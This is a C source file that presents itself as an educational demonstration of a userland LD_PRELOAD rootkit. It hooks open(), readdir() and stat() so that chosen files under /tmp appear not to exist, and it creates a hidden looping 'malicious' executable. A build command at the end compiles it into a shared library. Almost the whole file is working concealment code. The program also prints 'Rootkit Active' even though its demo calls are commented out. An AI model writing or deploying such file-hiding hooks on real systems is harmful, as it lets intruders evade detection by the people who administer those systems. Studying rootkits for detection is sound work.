#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <errno.h>
#include <fcntl.h>

// Function pointers for original system calls
static int (*original_open)(const char *pathname, int flags, ...) = NULL;
static struct dirent *(*original_readdir)(DIR *dirp) = NULL;
static int (*original_stat)(const char *pathname, struct stat *statbuf) = NULL;

// Hidden files and processes
static const char *hidden_files[] = {
    "/tmp/rootkit_file.txt",
    "/tmp/malicious_process",
    NULL
};

// Initialize function pointers to original system calls
void init_original_functions() {
    printf("=== Initializing Rootkit ===\n");
    
    // Get original function addresses with error checking
    original_open = dlsym(RTLD_NEXT, "open");
    if (!original_open) {
        fprintf(stderr, "Error: Could not find original open() function\n");
        fprintf(stderr, "dlsym error: %s\n", dlerror());
        exit(1);
    }
    
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    if (!original_readdir) {
        fprintf(stderr, "Error: Could not find original readdir() function\n");
        fprintf(stderr, "dlsym error: %s\n", dlerror());
        exit(1);
    }
    
    original_stat = dlsym(RTLD_NEXT, "stat");
    if (!original_stat) {
        fprintf(stderr, "Error: Could not find original stat() function\n");
        fprintf(stderr, "dlsym error: %s\n", dlerror());
        exit(1);
    }
    
    printf("✅ Original open() address: %p\n", original_open);
    printf("✅ Original readdir() address: %p\n", original_readdir);
    printf("✅ Original stat() address: %p\n", original_stat);
    printf("✅ Rootkit functions hooked successfully!\n\n");
}

// Check if a file should be hidden
int should_hide_file(const char *filename) {
    for (int i = 0; hidden_files[i] != NULL; i++) {
        if (strstr(filename, hidden_files[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

// Hooked open() function
int open(const char *pathname, int flags, ...) {
    printf("=== HOOKED open() called ===\n");
    printf("Attempting to open: %s\n", pathname);
    
    // Check if this file should be hidden
    if (should_hide_file(pathname)) {
        printf("❌ HIDING FILE: %s\n", pathname);
        printf("Returning ENOENT (No such file or directory)\n");
        errno = ENOENT;
        return -1;
    }
    
    // Call original function for non-hidden files
    printf("✅ Allowing access to: %s\n", pathname);
    return original_open(pathname, flags);
}

// Hooked readdir() function
struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;
    
    // Keep reading until we find a non-hidden entry
    do {
        entry = original_readdir(dirp);
        
        if (entry == NULL) {
            return NULL;
        }
        
        // Check if this entry should be hidden
        if (should_hide_file(entry->d_name)) {
            printf("=== HOOKED readdir() ===\n");
            printf("❌ HIDING DIRECTORY ENTRY: %s\n", entry->d_name);
            continue;  // Skip this entry
        }
        
    } while (should_hide_file(entry->d_name));
    
    return entry;
}

// Hooked stat() function
int stat(const char *pathname, struct stat *statbuf) {
    printf("=== HOOKED stat() called ===\n");
    printf("Attempting to stat: %s\n", pathname);
    
    // Check if this file should be hidden
    if (should_hide_file(pathname)) {
        printf("❌ HIDING FILE: %s\n", pathname);
        printf("Returning ENOENT (No such file or directory)\n");
        errno = ENOENT;
        return -1;
    }
    
    // Call original function for non-hidden files
    printf("✅ Allowing stat of: %s\n", pathname);
    return original_stat(pathname, statbuf);
}

// Function to create hidden files
void create_hidden_files() {
    printf("=== Creating Hidden Files ===\n");
    
    // Create a file that will be hidden
    FILE *fp = fopen("/tmp/rootkit_file.txt", "w");
    if (fp) {
        fprintf(fp, "This file is hidden by the rootkit!\n");
        fprintf(fp, "It contains malicious data that should not be visible.\n");
        fclose(fp);
        printf("✅ Created hidden file: /tmp/rootkit_file.txt\n");
    } else {
        printf("❌ Failed to create hidden file\n");
    }
    
    // Create another hidden file
    fp = fopen("/tmp/malicious_process", "w");
    if (fp) {
        fprintf(fp, "#!/bin/bash\n");
        fprintf(fp, "echo 'Malicious process running'\n");
        fprintf(fp, "while true; do sleep 1; done\n");
        fclose(fp);
        chmod("/tmp/malicious_process", 0755);
        printf("✅ Created hidden executable: /tmp/malicious_process\n");
    } else {
        printf("❌ Failed to create hidden executable\n");
    }
    
    printf("Hidden files created successfully!\n\n");
}

// Function to demonstrate rootkit hiding
void demonstrate_rootkit_hiding() {
    printf("=== Rootkit Hiding Demonstration ===\n");
    
    // Try to list /tmp directory
    printf("Listing /tmp directory:\n");
    DIR *dir = opendir("/tmp");
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                printf("  %s\n", entry->d_name);
            }
        }
        closedir(dir);
    }
    
    printf("\n=== Testing File Access ===\n");
    
    // Try to access hidden files
    printf("Attempting to access hidden file:\n");
    int fd = open("/tmp/rootkit_file.txt", O_RDONLY);
    if (fd == -1) {
        printf("❌ Access denied (file appears to not exist)\n");
    } else {
        printf("✅ File accessed successfully\n");
        close(fd);
    }
    
    // Try to stat hidden files
    printf("Attempting to stat hidden file:\n");
    struct stat st;
    if (stat("/tmp/rootkit_file.txt", &st) == -1) {
        printf("❌ Stat failed (file appears to not exist)\n");
    } else {
        printf("✅ File stat successful\n");
    }
    
    printf("\n=== Rootkit Detection Challenge ===\n");
    printf("The rootkit is now active and hiding files!\n");
    printf("Can you detect its presence?\n");
    printf("Try these commands:\n");
    printf("  ls -la /tmp/\n");
    printf("  cat /tmp/rootkit_file.txt\n");
    printf("  stat /tmp/rootkit_file.txt\n");
    printf("\n");
}

int main() {
    printf("=== Educational Rootkit Demonstration ===\n");
    printf("WARNING: This is for educational purposes only!\n");
    printf("This demonstrates how rootkits hide their presence.\n\n");
    
    // Initialize the rootkit
   // init_original_functions();
    
    // Create hidden files
   // create_hidden_files();
    
    // Demonstrate hiding
  //  demonstrate_rootkit_hiding();
    
    printf("=== Rootkit Active ===\n");
    printf("The rootkit is now running and hiding files.\n");
    printf("Press Enter to continue...\n");
    getchar();
    
    return 0;
}

// gcc -shared -fPIC -o librootkit.so rootkit.c -ldl
